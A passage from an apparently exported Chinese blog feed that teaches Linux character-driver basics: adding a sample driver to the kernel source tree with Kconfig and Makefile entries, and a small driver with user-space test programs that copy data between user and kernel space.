<figure class="highlight fix"><table><tr><td class="code"><pre><span class="line"><span class="attr">obj-y				+</span>=<span class="string"> vt/</span></span><br></pre></td></tr></table></figure>

<p>指的继续到vt目录调用Makefile</p>
<h2 id="3-可执行文件的链接"><a href="#3-可执行文件的链接" class="headerlink" title="3. 可执行文件的链接"></a>3. 可执行文件的链接</h2><p>每个目录在编译之后还有一个built-in.o文件，这个文件将该目录所有obj-y下的所有<code>.o</code>文件给链接起来。</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">[root@debian tty]<span class="comment"># ls -l built-in.o                   </span></span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>root root<span class="number"> 530256 </span>8月 <span class="number"> 24 </span>21:20 built-in.o</span><br></pre></td></tr></table></figure>





<p>在顶层Makefile代码找到所有的built-in.o，</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">vmlinux-dirs	:= $(patsubst %/,%,$(<span class="keyword">filter</span> %/, $(init-y) $(init-m) \</span><br><span class="line">		     $(core-y) $(core-m) $(drivers-y) $(drivers-m) \</span><br><span class="line">		     $(net-y) $(net-m) $(libs-y) $(libs-m) $(virt-y)))</span><br><span class="line"></span><br><span class="line">vmlinux-alldirs	:= $(<span class="keyword">sort</span> $(vmlinux-dirs) $(patsubst %/,%,$(<span class="keyword">filter</span> %/, \</span><br><span class="line">		     $(init-) $(core-) $(drivers-) $(net-) $(libs-) $(virt-))))</span><br><span class="line"></span><br><span class="line">init-y		:= $(patsubst %/, %/built-<span class="keyword">in</span>.o, $(init-y))</span><br><span class="line">core-y		:= $(patsubst %/, %/built-<span class="keyword">in</span>.o, $(core-y))</span><br><span class="line">drivers-y	:= $(patsubst %/, %/built-<span class="keyword">in</span>.o, $(drivers-y))</span><br><span class="line">net-y		:= $(patsubst %/, %/built-<span class="keyword">in</span>.o, $(net-y))</span><br><span class="line">libs-y1		:= $(patsubst %/, %/lib.a, $(libs-y))</span><br><span class="line">libs-y2		:= $(patsubst %/, %/built-<span class="keyword">in</span>.o, $(libs-y))</span><br><span class="line">libs-y		:= $(libs-y1) $(libs-y2)</span><br><span class="line">virt-y		:= $(patsubst %/, %/built-<span class="keyword">in</span>.o, $(virt-y))</span><br></pre></td></tr></table></figure>



<p>通过KBUILD_LDS链接起来，这里将vmlinux.lds链接脚本赋给KBUILD_LDS</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">export KBUILD_LDS          := arch<span class="regexp">/$(SRCARCH)/</span>kernel/vmlinux.lds</span><br></pre></td></tr></table></figure>



<p>最后通过链接工具调用链接脚本将所有built-in.o链接起来。</p>
<h2 id="4-将字符设备驱动添加到内核源码树"><a href="#4-将字符设备驱动添加到内核源码树" class="headerlink" title="4. 将字符设备驱动添加到内核源码树"></a>4. 将字符设备驱动添加到内核源码树</h2><h3 id="4-1-源码放入到对应的驱动目录"><a href="#4-1-源码放入到对应的驱动目录" class="headerlink" title="4.1 源码放入到对应的驱动目录"></a>4.1 源码放入到对应的驱动目录</h3><p>将之前编写的hellodev.c源代码放到内核的源码里面。</p>
<p>由于我们之前的驱动是字符设备驱动，所以先来到内核源码的drivers/char目录，需要放到char目录</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">[root<span class="title">@debian</span> linux]# cd linux<span class="number">-4.9</span>.<span class="number">229</span>/drivers/char</span><br><span class="line">[root<span class="title">@debian</span> char]# ls</span><br><span class="line">agp              efirtc.<span class="keyword">c</span>           mbcs.h           nvram.<span class="keyword">c</span>             random.o       toshiba.<span class="keyword">c</span></span><br><span class="line">apm-emulation.<span class="keyword">c</span>  generic_nvram.<span class="keyword">c</span>    mem.<span class="keyword">c</span>            nvram.o             raw.<span class="keyword">c</span>          tpm</span><br><span class="line">applicom.<span class="keyword">c</span>       hangcheck-timer.<span class="keyword">c</span>  mem.o            nwbutton.<span class="keyword">c</span>          rtc.<span class="keyword">c</span>          ttyprintk.<span class="keyword">c</span></span><br><span class="line">applicom.h       hpet.<span class="keyword">c</span>             misc.<span class="keyword">c</span>           nwbutton.h          scx<span class="number">200</span>_gpio.<span class="keyword">c</span>  uv_mmtimer.<span class="keyword">c</span></span><br><span class="line">bfin-otp.<span class="keyword">c</span>       hpet.o             misc.o           nwflash.<span class="keyword">c</span>           snsc.<span class="keyword">c</span>         virtio_console.<span class="keyword">c</span></span><br><span class="line">bsr.<span class="keyword">c</span>            hw_random          mmtimer.<span class="keyword">c</span>        pc<span class="number">8736</span>x_gpio.<span class="keyword">c</span>      snsc_event.<span class="keyword">c</span>   xilinx_hwicap</span><br><span class="line">built-in.o       ipmi               modules.<span class="keyword">builtin</span>  pcmcia              snsc.h         xillybus</span><br><span class="line">ds<span class="number">1302</span>.<span class="keyword">c</span>         Kconfig            modules.order    powernv-op-panel.<span class="keyword">c</span>  sonypi.<span class="keyword">c</span></span><br><span class="line">ds<span class="number">1620</span>.<span class="keyword">c</span>         lp.<span class="keyword">c</span>               mspec.<span class="keyword">c</span>          ppdev.<span class="keyword">c</span>             tb<span class="number">0219</span>.<span class="keyword">c</span></span><br><span class="line">dsp<span class="number">56</span>k.<span class="keyword">c</span>         Makefile           mwave            ps<span class="number">3</span>flash.<span class="keyword">c</span>          tile-srom.<span class="keyword">c</span></span><br><span class="line">dtlk.<span class="keyword">c</span>           mbcs.<span class="keyword">c</span>             nsc_gpio.<span class="keyword">c</span>       random.<span class="keyword">c</span>            tlclk.<span class="keyword">c</span></span><br></pre></td></tr></table></figure>

<p>将之前的hellodev.c复制到char目录</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@debian <span class="keyword">char</span>]# cp ~<span class="regexp">/code/</span>cpp<span class="regexp">/demo/</span>hellloDev<span class="regexp">/hellodev.c ./</span></span><br></pre></td></tr></table></figure>



<h3 id="4-2-修改Kconfig文件"><a href="#4-2-修改Kconfig文件" class="headerlink" title="4.2 修改Kconfig文件"></a>4.2 修改Kconfig文件</h3><p>要将字符设备驱动源代码加到内核源代码中，就需要修改Kconfig文件</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">[root@debian <span class="keyword">char</span>]<span class="meta"># vim Kconfig</span></span><br></pre></td></tr></table></figure>

<p>加入如下代码</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">config HELLO</span><br><span class="line">	tristate <span class="string">&quot;hello device&quot;</span></span><br><span class="line">    <span class="keyword">default</span> y</span><br><span class="line">    help</span><br><span class="line">      hello device</span><br></pre></td></tr></table></figure>

<p><strong>config:</strong></p>
<p>定义了一个<code>config HELLO</code>，最后config名称叫 <code>config_HELLO</code></p>
<p><strong>tristate:</strong></p>
<p>表示三态，y、m、n对应表示为：编译到内核、编译到驱动、不编译</p>
<p>如果不是tristate而是bool，表示只编译到内核里面或者不编译。</p>
<p><strong>default：</strong></p>
<p>表示默认的选择，是y,表示默认编译到内核。</p>
<p><strong>help：</strong></p>
<p>使用make menuconfig的时候的帮助信息。</p>
<p>下面我进入menuconfig检查一下配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@debian char]# cd ../../</span><br><span class="line">[root@debian linux-4.9.229]# make menuconfig</span><br></pre></td></tr></table></figure>



<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">——&gt;Device Drivers</span><br><span class="line">		——&gt;<span class="keyword">Character</span> devices</span><br></pre></td></tr></table></figure>

<p><img src="../images/pics/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%BA%95%E5%B1%82/16.jpg"></p>
<p>并且是*，因为我们配置的default是y。</p>
<h3 id="4-3-静态加载编译"><a href="#4-3-静态加载编译" class="headerlink" title="4.3 静态加载编译"></a>4.3 静态加载编译</h3><p>配置好后，重写编译一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@debian linux-4.9.229]# export ARCH=x86</span><br><span class="line">[root@debian linux-4.9.229]# make x86_64_defconfig</span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># configuration written to .config</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash">[root@debian linux-4.9.229]<span class="comment"># make</span></span></span><br><span class="line">scripts/kconfig/conf  --silentoldconfig Kconfig</span><br><span class="line">  CHK     include/config/kernel.release</span><br><span class="line">  CHK     include/generated/uapi/linux/ve</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p>进入字符驱动目录，发现并没有编译hellodev.c</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@debian linux-4.9.229]# cd ./drivers/char</span><br><span class="line">[root@debian char]# ls | grep hello</span><br><span class="line">hellodev.c</span><br></pre></td></tr></table></figure>

<p>这是因为我们并没有在Makefile里面添加对应的配置，所以编译系统就不会编译</p>
<p>在Makefile中加入如下配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@debian char]# vim Makefile</span><br></pre></td></tr></table></figure>

<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">obj-$(CONFIG_HELLO) += hellodev.o</span><br></pre></td></tr></table></figure>

<p>加入以后重写编译。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@debian char]# cd ../../</span><br><span class="line">[root@debian linux-4.9.229]# make</span><br></pre></td></tr></table></figure>

<p>编译完成后查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@debian linux-4.9.229]# cd ./drivers/char</span><br><span class="line">[root@debian char]# ls | grep hello</span><br><span class="line">hellodev.c</span><br><span class="line">hellodev.o</span><br></pre></td></tr></table></figure>

<p>这样就把我们的驱动编译到了内核里面。这样在启动内核的时候，这个驱动就会加载进来。</p>
<h3 id="4-4-配置驱动动态加载"><a href="#4-4-配置驱动动态加载" class="headerlink" title="4.4 配置驱动动态加载"></a>4.4 配置驱动动态加载</h3><p>这次再次配置menuconfig，修改为<code>M</code>，这样就会编译成ko文件</p>
<p><img src="../images/pics/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%BA%95%E5%B1%82/17.jpg"></p>
<p>再次编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@debian linux-4.9.229]# make</span><br><span class="line">scripts/kconfig/conf  --silentoldconfig Kconfig</span><br><span class="line">  CHK     include/config/kernel.release</span><br><span class="line">......</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#4)</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 19 modules</span><br><span class="line">  CC      drivers/char/hellodev.mod.o</span><br><span class="line">  LD [M]  drivers/char/hellodev.ko</span><br><span class="line">  </span><br><span class="line">[root@debian linux-4.9.229]# cd ./drivers/char</span><br><span class="line">[root@debian char]# ls | grep hello</span><br><span class="line">hellodev.c</span><br><span class="line">hellodev.ko</span><br><span class="line">hellodev.mod.c</span><br><span class="line">hellodev.mod.o</span><br><span class="line">hellodev.o</span><br></pre></td></tr></table></figure>

<p>这样我们就完成了驱动的动态加载与静态加载的编译。静态加载随着内核的启动而启动；动态加载内核并不会自动加载需要用insmod加载进内核。</p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux的内核空间与用户空间</title>
    <url>/Linux%E7%9A%84%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4%E4%B8%8E%E7%94%A8%E6%88%B7%E7%A9%BA%E9%97%B4/</url>
    <content><![CDATA[<p>了解Linux内核空间与用户空间的概念，然后编写一个用户空间与内核空间进行数据拷贝的驱动程序。</p>
<span id="more"></span>



<h2 id="1-地址划分"><a href="#1-地址划分" class="headerlink" title="1. 地址划分"></a>1. 地址划分</h2><p>在32位的系统里面，地址总线刚好是4GB大小，在4GB的线性地址空间里面，内核空间地址位于<code>3~4</code>GB之间，用户空间地址位于<code>0~3</code>GB之间，地址的划分并不固定，可以通过PAGE_OFFSET配置，PAGE_OFFSET默认等于0xC0000000，那么用户空间默认就是<code>0~3</code>GB了。</p>
<p><img src="../images/pics/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%BA%95%E5%B1%82/18.jpg"></p>
<h2 id="2-区别"><a href="#2-区别" class="headerlink" title="2. 区别"></a>2. 区别</h2><p>Linux内核空间主要用来做管理，用户空间运行用户的业务逻辑。</p>
<p><strong>处理模式不同，权限不同</strong></p>
<p>对于x86体系的cpu，用户空间代码运行在Ring3模式，内核空间代码运行Ring 0模式；</p>
<p>对于arm体系的cpu，用户空间代码运行在usr模式，内核空间代码运行在svc模式；</p>
<p><strong>安全考量</strong></p>
<p>整个系统中有各种资源，比如计算资源、内存资源和外设资源，而linux是多用户、多进程系统，所以，这些资源必须在受限的、被管理的状态下使用，要不然就陷入了混乱。空间隔离可以保证即便是单个应用程序出现错误也不会影响到操作系统的稳定性</p>
<p><strong>解耦</strong></p>
<p>从软件设计思想来看，解除了核心代码和业务逻辑代码的耦合。内核代码偏重于系统管理；而用户空间代码偏重于业务逻辑代码的实现。两者分工不同，隔离也是解耦。</p>
<h2 id="3-用户程序执行过程"><a href="#3-用户程序执行过程" class="headerlink" title="3. 用户程序执行过程"></a>3. 用户程序执行过程</h2><p>用户空间的程序时可以到内核空间去执行的，比如进行系统调用的时候。比如读取一个文件的时候，调用一个open函数，这些都会触发一个中断，然后陷入到内核空间去执行，执行的时候如果产生了硬件中断，比如定时器中断、外设中断，也会打断进程的执行，执行中断处理程序，中断处理程序完成后，才会用调度程序调度到用户进程上执行。</p>
<p><img src="../images/pics/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%BA%95%E5%B1%82/19.jpg"></p>
<h2 id="4-空间之间的数据拷贝"><a href="#4-空间之间的数据拷贝" class="headerlink" title="4. 空间之间的数据拷贝"></a>4. 空间之间的数据拷贝</h2><h3 id="4-1-驱动程序"><a href="#4-1-驱动程序" class="headerlink" title="4.1 驱动程序"></a>4.1 驱动程序</h3><p>编写一个简单的驱动，让驱动可以进行用户空间与内核空间的数据拷贝。</p>
<ul>
<li>ukcopy.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_MAX    (64)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK            (0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR         (-1)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> *<span class="title">gDev</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">gFile</span>;</span></span><br><span class="line"><span class="keyword">dev_t</span>  devNum;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> subDevNum = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> reg_major  =  <span class="number">233</span>;</span><br><span class="line"><span class="keyword">int</span> reg_minor =   <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> buffer[BUFFER_MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hello_open</span><span class="params">(struct inode *p, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_open\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">hello_write</span><span class="params">(struct file *f, <span class="keyword">const</span> <span class="keyword">char</span> __user *u, <span class="keyword">size_t</span> s, <span class="keyword">loff_t</span> *l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_write\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> writelen = <span class="number">0</span>;</span><br><span class="line">    writelen = BUFFER_MAX&gt;s? s : BUFFER_MAX;</span><br><span class="line">    <span class="comment">//将用户空间的u拷贝到内核空间</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(buffer, u, writelen)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> writelen;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">hello_read</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *u, <span class="keyword">size_t</span> s, <span class="keyword">loff_t</span> *l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_read\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> readlen;</span><br><span class="line">    readlen = BUFFER_MAX&gt;s ? s : BUFFER_MAX;</span><br><span class="line">    <span class="comment">//内核空间拷贝到内核空间</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(u, buffer, readlen)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> readlen;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//根据主次设备号生成dev number，这里在上方声明了是232和0</span></span><br><span class="line">    <span class="comment">//用来唯一标识一个设备，主设备号用来标识这类设备，次设备号用来标识这类设备里的不同设备</span></span><br><span class="line">    devNum = MKDEV(reg_major, reg_minor);</span><br><span class="line">    <span class="comment">//将设备号注册到内核里面，别人就不能用这个232,0设备号了。</span></span><br><span class="line">    <span class="comment">//subDevNum上面定义是1，表示从这里开始注册一个设备。</span></span><br><span class="line">    <span class="keyword">if</span>(OK == register_chrdev_region(devNum, subDevNum, <span class="string">&quot;helloworld&quot;</span>))&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;register_chrdev_region ok \n&quot;</span>); </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;register_chrdev_region error n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot; hello driver init \n&quot;</span>);</span><br><span class="line">    <span class="comment">//申请一个结构体，cdev代表一个字符设备</span></span><br><span class="line">    gDev = kzalloc(<span class="keyword">sizeof</span>(struct cdev), GFP_KERNEL);</span><br><span class="line">    <span class="comment">//申请一个file_operations结构体，file_operations代表对文件如何操作，read, write,open等操作</span></span><br><span class="line">    gFile = kzalloc(<span class="keyword">sizeof</span>(struct file_operations), GFP_KERNEL);</span><br><span class="line">    <span class="comment">//对gFile这个file_operations结构体指针进行赋值。</span></span><br><span class="line">    gFile-&gt;open = hello_open;</span><br><span class="line">    gFile-&gt;read = hello_read;</span><br><span class="line">    gFile-&gt;write = hello_write;</span><br><span class="line">    gFile-&gt;owner = THIS_MODULE;</span><br><span class="line">    <span class="comment">//建立字符设备与file_operations的联系</span></span><br><span class="line">    cdev_init(gDev, gFile);</span><br><span class="line">    <span class="comment">//建立字符设备与设备号的联系</span></span><br><span class="line">    cdev_add(gDev, devNum, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 	printk(KERN_INFO <span class="string">&quot; hello driver exit \n&quot;</span>);</span><br><span class="line">    cdev_del(gDev);</span><br><span class="line">    kfree(gFile);</span><br><span class="line">    kfree(gDev);</span><br><span class="line">    unregister_chrdev_region(devNum, subDevNum);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明入口函数是hello_init函数</span></span><br><span class="line">module_init(hello_init);</span><br><span class="line"><span class="comment">//声明驱动的删除函数</span></span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"><span class="comment">//版权声明</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>Makefile</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">	obj-m := ukcopy.o</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	KERN_DIR ?= /usr/src/linux-headers-<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/</span><br><span class="line">	PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERN_DIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure>

<p>编译，将驱动加载进去</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">make</span></span><br><span class="line">insmod ukcopy.ko</span><br></pre></td></tr></table></figure>



<h3 id="4-2-将用户空间的数据拷贝到内核空间"><a href="#4-2-将用户空间的数据拷贝到内核空间" class="headerlink" title="4.2 将用户空间的数据拷贝到内核空间"></a>4.2 将用户空间的数据拷贝到内核空间</h3><ul>
<li>write.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATA_NUM    (32)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd, i;</span><br><span class="line">    <span class="keyword">int</span> r_len, w_len;</span><br><span class="line">    fd_set fdset;</span><br><span class="line">    <span class="keyword">char</span> buf[DATA_NUM] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ukcopy&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == fd) &#123;</span><br><span class="line">      	perror(<span class="string">&quot;open file error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;	</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;open success\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    w_len = write(fd, buf, DATA_NUM);</span><br><span class="line">    <span class="keyword">if</span>(w_len == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;write error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write len: %d\n&quot;</span>, w_len);</span><br><span class="line">	close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>根据驱动先创建设备文件</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> driver]<span class="meta"># mknod /dev/ukcopy c 233 0</span></span><br></pre></td></tr></table></figure>

<p>编译执行</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">[root@debian test]# gcc -o <span class="built_in">write</span> <span class="built_in">write</span>.c</span><br><span class="line">[root@debian test]# ./<span class="built_in">write</span> </span><br><span class="line"><span class="built_in">open</span> success</span><br><span class="line"><span class="built_in">write</span> <span class="built_in">len</span>: <span class="number">32</span></span><br></pre></td></tr></table></figure>

<p>如上表示将<code>hello world</code>写入到了内核</p>
<h3 id="4-3-将内核空间数据拷贝到用户空间"><a href="#4-3-将内核空间数据拷贝到用户空间" class="headerlink" title="4.3 将内核空间数据拷贝到用户空间"></a>4.3 将内核空间数据拷贝到用户空间</h3><ul>
<li>read.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATA_NUM    (32)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd, i;</span><br><span class="line">    <span class="keyword">int</span> r_len, w_len;</span><br><span class="line">    fd_set fdset;</span><br><span class="line">    <span class="keyword">char</span> rbuf[DATA_NUM];</span><br><span class="line">    <span class="built_in">memset</span>(rbuf,<span class="number">0</span>,DATA_NUM);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ukcopy&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == fd) &#123;</span><br><span class="line">      	perror(<span class="string">&quot;open file error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;	</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;open successe\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	r_len = read(fd, rbuf, DATA_NUM);</span><br><span class="line">	<span class="keyword">if</span>(r_len == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read len: %d\n&quot;</span>, r_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, rbuf);</span><br><span class="line">	close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译执行</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">[root@debian <span class="keyword">test</span>]# gcc -o <span class="keyword">read</span> <span class="keyword">read</span>.c </span><br><span class="line">[root@debian <span class="keyword">test</span>]# ./<span class="keyword">read</span> </span><br><span class="line"><span class="keyword">open</span> successe</span><br><span class="line"><span class="keyword">read</span> len: 32</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>

<p>成功从内核读取到了想要的数据。</p>
<p>前面说到内核和用户空间是线性地址划分，但是实际拷贝的时候并不是从一个地址到另一个地址，因为这是虚拟地址，实际拷贝的时候需要找到物理地址。如果在同一个物理页，一次就能成功，如果不在同一页，就需要跨页，消耗更多性能，而且如果物理页不在内存上，就会缺页，还需要将磁盘数据读取到内存，所以一个简单的复制操作，也会有很多细节。</p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot基础</title>
    <url>/SpringBoot%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>SpringBoot入门案例</p>
<span id="more"></span>

